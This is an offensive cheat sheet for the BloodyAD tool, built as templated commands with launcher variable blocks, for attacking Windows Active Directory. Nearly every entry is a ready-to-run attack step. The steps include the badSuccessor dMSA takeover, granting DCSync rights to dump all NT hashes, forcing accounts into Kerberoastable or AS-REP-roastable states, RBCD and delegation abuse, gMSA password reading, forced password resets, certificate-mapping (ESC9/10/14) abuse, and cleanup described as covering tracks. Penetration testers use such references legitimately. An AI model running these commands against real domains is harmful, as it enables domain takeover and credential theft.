# BloodyAD

<!-- cheat
export bloody_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --map "cut -f1" --heaader "Select Auth Method"

if $auth_method != kerberos
var credential = --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := -p :$credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k
fi
-->

### badSuccessor

Run badSuccessor with BloodyAD.

Exploit the badSuccessor primitive to take over the target via dMSA migration abuse. Pass the computer name **without** a trailing `$` - BloodyAD appends it internally and doubling it breaks the attack.

```sh title:"BloodyAD Run BadSuccessor"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add badSuccessor $rhost_name
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rhost_name
-->

### DCSync right

Set DCSync right with BloodyAD.

Grant the target user DS-Replication-Get-Changes and Get-Changes-All on the domain root so they can DCSync and dump every NT hash.

```sh title:"BloodyAD Set DCSync Right"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add dcsync $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### SPN on user

Enumerate SPN on user with BloodyAD.

Write a servicePrincipalName onto a user account to make it Kerberoastable on demand (targeted Kerberoasting when you already control the user).

```sh title:"BloodyAD Enumerate SPN on User"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add spn $target_user $spn_value
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var spn_value
-->

### WriteDacl right

Write WriteDacl right with BloodyAD.

Grant WRITE_DACL on a target DN - lets the grantee rewrite the object's ACL later (classic privesc staging step).

```sh title:"BloodyAD Write WriteDacl Right"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add writeDacl $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### GenericWrite right

Write GenericWrite right with BloodyAD.

Grant GenericWrite on the target DN - enough to add an SPN or shadow credentials without full GenericAll.

```sh title:"BloodyAD Write GenericWrite Right"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add genericWrite $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### Group member

Create group member with BloodyAD.

Add a user to a group. Most common use: adding yourself to a privileged group after chaining writeMember/genericAll.

```sh title:"BloodyAD Create Group Member"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add groupMember $group_name $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var group_name
var target_user
-->

### GenericAll right

Dump GenericAll right with BloodyAD.

Grant GenericAll on the DN - full control, including reset password, add members, and rewrite ACLs.

```sh title:"BloodyAD Dump GenericAll Right"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add genericAll $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### Trusted for auth delegation

Run trusted for auth delegation with BloodyAD.

Set the UAC `TRUSTED_TO_AUTH_FOR_DELEGATION` flag - required for S4U2Self abuse (constrained delegation with protocol transition).

```sh title:"BloodyAD Run Trusted for Auth Delegation"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add uac $target_user -f TRUSTED_TO_AUTH_FOR_DELEGATION
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### Disable pre-auth

Disable pre auth with BloodyAD.

Set `DONT_REQ_PREAUTH` on the target so it becomes ASREPRoastable on the next request.

```sh title:"BloodyAD Disable Pre Auth"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add uac $target_user -f DONT_REQ_PREAUTH
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### RBCD

Run RBCD with BloodyAD.

Configure Resource-Based Constrained Delegation: `delegate_from` (attacker-controlled computer) can impersonate any user to `delegate_to`.

```sh title:"BloodyAD Run RBCD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add rbcd '$delegate_to' '$delegate_from'
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var delegate_to
var delegate_from
-->

### New computer account

Create computer account with BloodyAD.

Create a computer account (if MachineAccountQuota > 0) - first step for RBCD and Shadow Credentials attacks when you need your own principal.

```sh title:"BloodyAD Create Computer Account"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add computer $rhost_name $target_pass
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rhost_name
var target_pass
-->

### DNS record

Run DNS record with BloodyAD.

Register an ADIDNS record pointing at your attacker IP - useful for WPAD, MITM, or coercion chains.

```sh title:"BloodyAD Run DNS Record"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add dnsRecord $record_name $lhost
```
<!-- cheat
import domain_ip
import users
import bloody_auth
import tun_ip
var rhost_name
var record_name
-->

### Trusts

Run trusts with BloodyAD.

List domain and forest trust relationships - map the attack surface across trust boundaries.

```sh title:"BloodyAD Run Trusts"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get trusts
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### DNS dump

Dump DNS dump with BloodyAD.

Dump every ADIDNS record - equivalent to adidnsdump, reveals internal hostnames without port scanning.

```sh title:"BloodyAD Dump DNS Dump"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get dnsDump
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### BloodHound collection

Run BloodHound collection with BloodyAD.

Run BloodHound collection via BloodyAD's built-in collector - alternative when bloodhound-python isn't working.

```sh title:"BloodyAD Run BloodHound Collection"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get bloodhound
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### RBCD on computer

Read RBCD on computer with BloodyAD.

Read the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to see who's already configured for RBCD against the target.

```sh title:"BloodyAD Read RBCD on Computer"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get rbcd $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
-->

### Object info

Read object info with BloodyAD.

Dump all readable attributes on a user/group/computer - quick way to check UAC flags, group membership, descriptions, and SPNs.

```sh title:"BloodyAD Read Object Info"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### gMSA password

Read gMSA password with BloodyAD.

Read the encoded msDS-ManagedPassword blob from a gMSA - BloodyAD decodes automatically unless `--raw` is passed.

```sh title:"BloodyAD Read GMSA Password"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user --attr msDS-ManagedPassword
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### gMSA raw blob

Dump gMSA raw blob with BloodyAD.

Read the raw msDS-ManagedPassword blob for manual decoding (feed into gMSADumper / custom scripts).

```sh title:"BloodyAD Dump GMSA Raw Blob"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user --attr msDS-ManagedPassword --raw
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Writable attributes

Write writable attributes with BloodyAD.

Find every object whose attributes the current principal can write to - maps immediate privesc paths via ACL abuse.

```sh title:"BloodyAD Write Writable Attributes"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get writable --detail
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### Object attribute

Read object attribute with BloodyAD.

Pull one specific attribute from one object - faster than dumping everything when you know what you're after.

```sh title:"BloodyAD Read Object Attribute"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $object --attr $attribute
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var attribute = printf 'msDS-ManagedPassword\nms-DS-MachineAccountQuota\nmember\nmanagedBy\ndescription\nprimaryGroupID\nmemberOf\nmsDS-KeyCredentialLink\nsAMAccountName\nadminCount\nms-Mcs-AdmPwd\nms-Mcs-AdmPwdExpirationTime\ntrustDirection\ntrustType\ntrustAttributes\nnTSecurityDescriptor\nuserPrincipalName\nservicePrincipalName\nuserAccountControl\n'
var rhost_name
var object
-->

### Reset password

Dump reset password with BloodyAD.

Force-reset a target user's password - requires Reset Password extended right or GenericAll.

```sh title:"BloodyAD Dump Reset Password"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set password $target_user $target_pass
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
var target_pass
-->

### Change owner

Write change owner with BloodyAD.

Rewrite the owner of an object to yourself via WriteOwner - gives you implicit WriteDacl and a path to full control.

```sh title:"BloodyAD Write Change Owner"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set owner $target_group $user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_group
-->

### UPN rewrite

Read UPN rewrite with BloodyAD.

Rewrite userPrincipalName. Key trick for ESC9/ESC10 certificate template abuse and UPN impersonation attacks.

```sh title:"BloodyAD Read UPN Rewrite"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $old_upn userPrincipalName -v $new_upn
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var old_upn
var new_upn
-->

### Mail attribute

Dump mail attribute with BloodyAD.

Modify the `mail` attribute - used in some password reset / OAuth flows and phishing staging.

```sh title:"BloodyAD Dump Mail Attribute"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user mail -v $new_mail
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var new_mail
var target_user
-->

### altSecurityIdentities (ESC14)

Run altSecurityIdentities (ESC14) with BloodyAD.

Write altSecurityIdentities with an X509 issuer/subject claim for explicit cert mapping (ESC14b weak mapping abuse).

```sh title:"BloodyAD Run AltSecurityIdentities (ESC14)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user altSecurityIdentities -v '$x509_claim'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var x509_claim
var target_user
-->

### Overwrite SPN

Create overwrite SPN with BloodyAD.

Overwrite (not append) the servicePrincipalName attribute - destructive variant of `add spn`, wipes existing SPNs.

```sh title:"BloodyAD Create Overwrite SPN"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user servicePrincipalName -v '$spn_value'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var spn_value
var target_user
-->

### Clear logon hours

Read clear logon hours with BloodyAD.

Remove the logonHours restriction so the account can auth 24/7 - unblocks scheduled auth for accounts with time windows.

```sh title:"BloodyAD Read Clear Logon Hours"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user logonHours
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Default UAC (512)

Set default UAC (512) with BloodyAD.

Reset userAccountControl to 512 (NORMAL_ACCOUNT) - clears custom flags like DISABLED, DONT_REQ_PREAUTH, TRUSTED_FOR_DELEGATION.

```sh title:"BloodyAD Set Default UAC (512)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user userAccountControl -v 512
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### displayName

Write displayName with BloodyAD.

Set the displayName attribute - low-stakes edit, useful for confirming write access without breaking anything.

```sh title:"BloodyAD Write DisplayName"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user displayName -v '$display_name'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var display_name
var target_user
-->

### description

Write description with BloodyAD.

Set the description attribute - another cheap write; admins sometimes store passwords here (worth scanning too).

```sh title:"BloodyAD Write Description"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user description -v '$description'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
var description
-->

### Constrained delegation target

Enumerate constrained delegation target with BloodyAD.

Write msDS-AllowedToDelegateTo on a computer - configures classic constrained delegation (S4U2Proxy to listed SPNs).

```sh title:"BloodyAD Enumerate Constrained Delegation Target"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $rhost_name msDS-AllowedToDelegateTo -v '$spn_value'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
var spn_value
-->

### MachineAccountQuota

Set MachineAccountQuota with BloodyAD.

Set ms-DS-MachineAccountQuota on the domain root - raises/lowers how many computers users can join (default 10).

```sh title:"BloodyAD Set MachineAccountQuota"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object MachineAccountQuota -v 10
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### Restore User

Remove restore user with BloodyAD.

Restore a deleted object by DN, SID, or unique sAMAccountName/name. Avoid sAMAccountName when duplicates exist.

```sh title:"BloodyAD Remove Restore User"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set restore $target_user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Enable account

Enable account with BloodyAD.

Clear the ACCOUNTDISABLE UAC bit to re-enable a disabled account - often needed after hijacking an old/stale account.

```sh title:"BloodyAD Enable Account"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove uac $target_user -f ACCOUNTDISABLE
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Remove from group

Remove BloodyAD from group.

Remove a user from a group - cleanup after a membership privesc to cover tracks.

```sh title:"BloodyAD Remove from Group"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove groupMember $group_name $target_user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var group_name
var target_user
-->

### Delete computer

Remove computer with BloodyAD.

Delete a computer account - usually used to clean up attacker-created machine accounts from RBCD/shadow-creds setup.

```sh title:"BloodyAD Remove Computer"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove computer $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
-->

### Remove RBCD

Remove RBCD with BloodyAD.

Strip an entry from msDS-AllowedToActOnBehalfOfOtherIdentity - undo an RBCD takeover after you're done.

```sh title:"BloodyAD Remove RBCD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove rbcd '$delegate_to' '$delegate_from'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var delegate_to
var delegate_from
-->

### Remove SPN

Remove SPN with BloodyAD.

Remove a single SPN from a user - targeted cleanup after a forced-Kerberoast operation.

```sh title:"BloodyAD Remove SPN"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove servicePrincipalName $target_user $spn_value
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var spn_value
var target_user
-->

### Custom LDAP filter

Execute custom LDAP filter with BloodyAD.

Run an arbitrary LDAP filter - for queries the canned subcommands don't cover.

```sh title:"BloodyAD Execute Custom LDAP Filter"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get search --filter "$ldap_query"
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
import ldap_query
var rhost_name
-->

### Tombstoned search

Find tombstoned search with BloodyAD.

Include tombstoned (deleted) objects in the search via LDAP show-deleted + show-recycled controls.

```sh title:"BloodyAD Find Tombstoned Search"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
import ldap_query
var rhost_name
-->
